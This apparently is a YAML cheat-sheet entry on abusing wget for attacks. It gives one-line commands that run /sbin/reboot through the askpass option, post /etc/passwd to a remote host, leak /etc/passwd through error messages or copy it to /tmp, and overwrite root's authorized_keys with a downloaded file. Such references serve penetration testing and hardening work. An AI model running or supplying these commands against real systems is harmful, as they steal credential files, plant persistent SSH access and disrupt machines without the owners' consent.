---
functions:
  command:
    - description: Can be used to execute any command or file on a system, but without any arguments, and without stdout/stderr. This can be useful if you are able to write an executable to the server beforehand. The example here invokes /sbin/reboot.
      code: |
        wget --use-askpass=/sbin/reboot http://0/
  file-upload:
    - description: Send a local file to a remote server in a POST request. Note that the file will be sent as-is.
      code: |
        wget --post-file=/etc/passwd http://0/
  file-read:
    - description: Read local files by importing the file as URIs to be retrieved. The content of the file will be displayed as error messages.
      code: |
        wget --input-file=/etc/passwd http://0/
  file-write:
    - description: Reads local data and writes the output to a file. This is only suitable for displaying non-binary files, as the output is an error-log.
      code: |
        wget --input-file=/etc/passwd --output-file=/tmp/passwd.txt
  file-download:
    - description: Downloads a remote file via an HTTP GET request and saves it to a specific location.
      code: |
        wget --output-document=/root/.ssh/authorized_keys http://0/
---
